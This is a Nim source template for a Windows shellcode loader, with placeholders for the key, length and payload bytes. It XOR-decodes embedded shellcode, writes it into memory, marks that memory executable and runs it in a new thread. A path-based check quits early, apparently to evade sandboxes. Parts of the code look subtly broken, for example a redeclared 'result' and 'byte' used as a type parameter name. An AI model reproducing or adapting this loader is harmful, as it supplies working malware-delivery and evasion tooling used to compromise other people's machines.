import winim/lean
import os

proc xorEncrypt[I, J, byte](code: array[I, byte], key: array[J, byte]): array[I, byte] =
  var result: array[I, byte]
  for i in 0 ..< code.len:
    result[i] = code[i] xor key[i mod key.len]
  return result

proc Ldr1[I, T](shellcode: array[I, T]): void =

    var pHandle: HANDLE = GetCurrentProcess()

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
    )
    var key: array[10, byte] = [byte {{Key}} ]

    var shellcode: array[{{Len}}, byte] = xorEncrypt(shellcode, key)

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    var oldProtectCalc: DWORD
    let rv = VirtualProtect(rPtr, shellcode.len, PAGE_EXECUTE_READ, cast[PDWORD](addr(oldProtectCalc)))

    if rv != 0:
        var tHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](rPtr), nil, 0, nil)
        WaitForSingleObject(tHandle, -1)

when defined(windows):

    var shellcode: array[{{Len}}, byte] = [
        byte {{Shellcode}} ]

    when isMainModule:
        let path = getAppFilename()
        if path[10] == '\\':
            quit(1)
        else:
            Ldr1(shellcode)